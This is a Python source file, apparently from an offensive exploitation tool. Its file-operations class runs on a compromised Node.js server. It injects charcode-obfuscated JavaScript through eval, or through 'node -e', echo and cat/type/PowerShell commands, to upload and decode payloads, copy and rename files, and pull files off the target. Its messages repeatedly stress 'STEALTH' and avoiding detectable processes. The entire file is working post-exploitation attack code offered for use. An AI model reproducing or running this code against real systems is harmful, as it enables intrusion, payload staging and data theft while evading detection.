import os
from exploit_tool.theme import Theme
from exploit_tool.utils import to_charcode

class FileOperations:
    """File upload/download/decode operations"""
    
    def __init__(self, shell):
        self.shell = shell
        self.engine = shell.engine
        self.config = shell.config
    
    def upload(self, filepath):
        """Upload file via eval (NO spawn - pure Node.js APIs) - RECOMMENDED"""
        if not os.path.exists(filepath):
            print(f"{Theme.FAIL}[!] Error: File '{filepath}' not found{Theme.ENDC}")
            return
        
        try:
            with open(filepath, 'r') as f:
                b64_content = f.read().strip()
            
            filesize = len(b64_content)
            
            print(f"{Theme.OKGREEN}[*] Uploading {filepath} ({filesize} chars) via eval (NO spawn - STEALTH!)...{Theme.ENDC}")
            
            # Chunked upload - avoid command line limit
            chunk_size = 2000
            chunks = [b64_content[i:i+chunk_size] for i in range(0, len(b64_content), chunk_size)]
            
            print(f"{Theme.OKCYAN}[*] Uploading in {len(chunks)} chunk(s)...{Theme.ENDC}")
            
            for idx, chunk in enumerate(chunks):
                if idx == 0:
                    # First chunk - writeFileSync
                    js_code = f"process.mainModule.require('fs').writeFileSync('out.b64','{chunk}')"
                else:
                    # Subsequent chunks - appendFileSync
                    js_code = f"process.mainModule.require('fs').appendFileSync('out.b64','{chunk}')"
                
                # Convert JS code to charcode
                code_charcode = to_charcode(js_code)
                eval_cmd = f"eval(String.fromCharCode({code_charcode}))"
                
                success, status, output = self.engine.execute(eval_cmd, use_eval=True, silent=True)
                
                if not success and status != 'server_error':
                    print(f"{Theme.FAIL}[!] Upload failed at chunk {idx+1}/{len(chunks)}: {output}{Theme.ENDC}")
                    return
            
            print(f"{Theme.OKGREEN}[+] File uploaded successfully -> out.b64 (NO process spawn!){Theme.ENDC}")
            print(f"{Theme.DIM}[*] Use 'decode out.b64 output.file' to decode{Theme.ENDC}")
        
        except Exception as e:
            print(f"{Theme.FAIL}[!] Error: {e}{Theme.ENDC}")
    
    def upload_deprecated(self, filepath, method='echo'):
        """[DEPRECATED] Legacy upload methods - kept as case study"""
        print(f"{Theme.WARNING}[!] WARNING: This method is DEPRECATED and may spawn detectable processes{Theme.ENDC}")
        print(f"{Theme.DIM}[*] Use 'upload' command instead for stealth (NO process spawn){Theme.ENDC}\n")
        
        if not os.path.exists(filepath):
            print(f"{Theme.FAIL}[!] Error: File '{filepath}' not found{Theme.ENDC}")
            return
        
        try:
            # Both methods expect pre-encoded base64 file and write AS-IS (no decode)
            with open(filepath, 'r') as f:
                b64_content = f.read().strip()
            
            filesize = len(b64_content)
            
            if method == 'node':
                # Node.js method - use String.fromCharCode to avoid quotes and echo
                print(f"{Theme.OKCYAN}[*] Uploading {filepath} ({filesize} chars) via Node.js (spawns node.exe)...{Theme.ENDC}")
                
                fs_code = to_charcode('fs')
                out_code = to_charcode('out.b64')
                
                # Chunked upload - no echo, no pipe, pure Node.js
                chunk_size = 2000  # Safe size to avoid command line limit
                chunks = [b64_content[i:i+chunk_size] for i in range(0, len(b64_content), chunk_size)]
                
                print(f"{Theme.OKCYAN}[*] Uploading in {len(chunks)} chunk(s)...{Theme.ENDC}")
                
                for idx, chunk in enumerate(chunks):
                    chunk_code = to_charcode(chunk)
                    
                    if idx == 0:
                        # First chunk - writeFileSync (create/overwrite)
                        cmd = f"node -e require(String.fromCharCode({fs_code})).writeFileSync(String.fromCharCode({out_code}),String.fromCharCode({chunk_code}))"
                    else:
                        # Subsequent chunks - appendFileSync
                        cmd = f"node -e require(String.fromCharCode({fs_code})).appendFileSync(String.fromCharCode({out_code}),String.fromCharCode({chunk_code}))"
                    
                    success, status, output = self.engine.execute(cmd, silent=True)
                    
                    if not success and status != 'server_error':
                        print(f"{Theme.FAIL}[!] Upload failed at chunk {idx+1}/{len(chunks)}: {output}{Theme.ENDC}")
                        return
                
                print(f"{Theme.OKGREEN}[+] File uploaded successfully -> out.b64{Theme.ENDC}")
                print(f"{Theme.DIM}[*] Use 'decode out.b64 output.file' to decode{Theme.ENDC}")
            else:
                # Echo method - write base64 content using echo
                print(f"{Theme.OKCYAN}[*] Uploading {filepath} ({filesize} chars) via echo (spawns cmd.exe)...{Theme.ENDC}")
                
                cmd = f'echo {b64_content} > out.b64'
                success, status, output = self.engine.execute(cmd, silent=True)
                
                if success or status == 'server_error':
                    print(f"{Theme.OKGREEN}[+] File uploaded successfully -> out.b64{Theme.ENDC}")
                    print(f"{Theme.DIM}[*] Use 'decode out.b64 output.file' to decode{Theme.ENDC}")
                else:
                    print(f"{Theme.FAIL}[!] Upload failed: {output}{Theme.ENDC}")
                
        except Exception as e:
            print(f"{Theme.FAIL}[!] Error: {e}{Theme.ENDC}")
    
    def decode(self, args):
        """Decode base64 file via eval (NO spawn - pure Node.js APIs) - RECOMMENDED"""
        parts = args.split()
        if len(parts) < 2:
            print(f"{Theme.FAIL}[!] Usage: decode <input.b64> <output.bin>{Theme.ENDC}")
            return
        
        input_file = parts[0]
        output_file = parts[1]
        
        print(f"{Theme.OKGREEN}[*] Decoding {input_file} -> {output_file} via eval (NO spawn - STEALTH!)...{Theme.ENDC}")
        
        # Build JavaScript code to decode base64
        js_code = f"process.mainModule.require('fs').writeFileSync('{output_file}',Buffer.from(process.mainModule.require('fs').readFileSync('{input_file}','utf8').trim(),'base64'))"
        
        # Convert to String.fromCharCode
        code_charcode = to_charcode(js_code)
        eval_cmd = f"eval(String.fromCharCode({code_charcode}))"
        
        success, status, output = self.engine.execute(eval_cmd, use_eval=True, silent=True)
        
        if success or status == 'server_error':
            print(f"{Theme.OKGREEN}[+] File decoded successfully -> {output_file} (NO process spawn!){Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Decode failed: {output}{Theme.ENDC}")
    
    def decode_deprecated(self, args):
        """[DEPRECATED] Decode base64 file using Node.js - spawns node.exe"""
        print(f"{Theme.WARNING}[!] WARNING: This method is DEPRECATED and spawns node.exe process{Theme.ENDC}")
        print(f"{Theme.DIM}[*] Use 'decode' command instead for stealth (NO process spawn){Theme.ENDC}\n")
        
        parts = args.split()
        if len(parts) < 2:
            print(f"{Theme.FAIL}[!] Usage: decode-node <input.b64> <output.bin>{Theme.ENDC}")
            return
        
        input_file = parts[0]
        output_file = parts[1]
        
        print(f"{Theme.OKCYAN}[*] Decoding {input_file} -> {output_file} via Node.js (spawns node.exe)...{Theme.ENDC}")
        
        fs_code = to_charcode('fs')
        input_code = to_charcode(input_file)
        output_code = to_charcode(output_file)
        utf8_code = to_charcode('utf8')
        base64_code = to_charcode('base64')
        
        # Decode base64 using Node.js - no quotes, pure String.fromCharCode
        cmd = f"node -e require(String.fromCharCode({fs_code})).writeFileSync(String.fromCharCode({output_code}),Buffer.from(require(String.fromCharCode({fs_code})).readFileSync(String.fromCharCode({input_code}),String.fromCharCode({utf8_code})).trim(),String.fromCharCode({base64_code})))"
        
        success, status, output = self.engine.execute(cmd, silent=True)
        
        if success or status == 'server_error':
            print(f"{Theme.OKGREEN}[+] File decoded successfully -> {output_file}{Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Decode failed: {output}{Theme.ENDC}")
    
    def copy(self, args):
        """Copy file via eval (NO spawn - pure Node.js APIs) - RECOMMENDED"""
        parts = args.split()
        if len(parts) < 2:
            print(f"{Theme.FAIL}[!] Usage: copyfile <source> <destination>{Theme.ENDC}")
            return
        
        source_file = parts[0]
        dest_file = parts[1]
        
        print(f"{Theme.OKGREEN}[*] Copying {source_file} -> {dest_file} via eval (NO spawn - STEALTH!)...{Theme.ENDC}")
        
        # Build JavaScript code to copy file using fs.copyFileSync
        js_code = f"process.mainModule.require('fs').copyFileSync('{source_file}','{dest_file}')"
        
        # Convert to String.fromCharCode
        code_charcode = to_charcode(js_code)
        eval_cmd = f"eval(String.fromCharCode({code_charcode}))"
        
        success, status, output = self.engine.execute(eval_cmd, use_eval=True, silent=True)
        
        if success or status == 'server_error':
            print(f"{Theme.OKGREEN}[+] File copied successfully -> {dest_file} (NO process spawn!){Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Copy failed: {output}{Theme.ENDC}")
    
    def rename(self, args):
        """Rename/move file via eval (NO spawn - pure Node.js APIs) - RECOMMENDED"""
        parts = args.split()
        if len(parts) < 2:
            print(f"{Theme.FAIL}[!] Usage: rename <old_name> <new_name>{Theme.ENDC}")
            return
        
        old_name = parts[0]
        new_name = parts[1]
        
        print(f"{Theme.OKGREEN}[*] Renaming {old_name} -> {new_name} via eval (NO spawn - STEALTH!)...{Theme.ENDC}")
        
        # Build JavaScript code to rename file using fs.renameSync
        js_code = f"process.mainModule.require('fs').renameSync('{old_name}','{new_name}')"
        
        # Convert to String.fromCharCode
        code_charcode = to_charcode(js_code)
        eval_cmd = f"eval(String.fromCharCode({code_charcode}))"
        
        success, status, output = self.engine.execute(eval_cmd, use_eval=True, silent=True)
        
        if success or status == 'server_error':
            print(f"{Theme.OKGREEN}[+] File renamed successfully -> {new_name} (NO process spawn!){Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Rename failed: {output}{Theme.ENDC}")
    
    def download(self, remote_path):
        """Download file from target via eval (NO spawn - pure Node.js APIs) - RECOMMENDED"""
        print(f"{Theme.OKGREEN}[*] Downloading {remote_path} via eval (NO spawn - STEALTH!)...{Theme.ENDC}")
        
        # Build JavaScript code to read file
        js_code = f"process.mainModule.require('fs').readFileSync('{remote_path}','utf8')"
        
        # Convert to String.fromCharCode
        code_charcode = to_charcode(js_code)
        eval_cmd = f"eval(String.fromCharCode({code_charcode}))"
        
        success, status, output = self.engine.execute(eval_cmd, use_eval=True, silent=True)
        
        if success and output.strip():
            filename = os.path.basename(remote_path)
            local_path = f"downloaded_{filename}"
            
            try:
                with open(local_path, 'w', encoding='utf-8') as f:
                    f.write(output)
                print(f"{Theme.OKGREEN}[+] File saved to: {local_path} (NO process spawn!){Theme.ENDC}")
            except Exception as e:
                print(f"{Theme.FAIL}[!] Error saving file: {e}{Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Download failed: {output if output else 'No output received'}{Theme.ENDC}")
    
    def download_deprecated(self, remote_path):
        """[DEPRECATED] Download file from target - kept as case study"""
        print(f"{Theme.WARNING}[!] WARNING: This method is DEPRECATED and may spawn detectable processes{Theme.ENDC}")
        print(f"{Theme.DIM}[*] Use 'download' command instead for stealth (NO process spawn){Theme.ENDC}\n")
        
        print(f"{Theme.OKCYAN}[*] Downloading {remote_path}...{Theme.ENDC}")
        
        # Try different commands based on OS
        commands = [
            f"type {remote_path}",           # Windows
            f"cat {remote_path}",             # Unix
            f"powershell -c Get-Content {remote_path}"  # PowerShell
        ]
        
        for cmd in commands:
            success, status, output = self.engine.execute(cmd, silent=True)
            if success and output.strip():
                filename = os.path.basename(remote_path)
                local_path = f"downloaded_{filename}"
                
                try:
                    with open(local_path, 'w', encoding='utf-8') as f:
                        f.write(output)
                    print(f"{Theme.OKGREEN}[+] File saved to: {local_path}{Theme.ENDC}")
                    return
                except Exception as e:
                    print(f"{Theme.FAIL}[!] Error saving file: {e}{Theme.ENDC}")
                    return
        
        print(f"{Theme.FAIL}[!] Failed to download file{Theme.ENDC}")


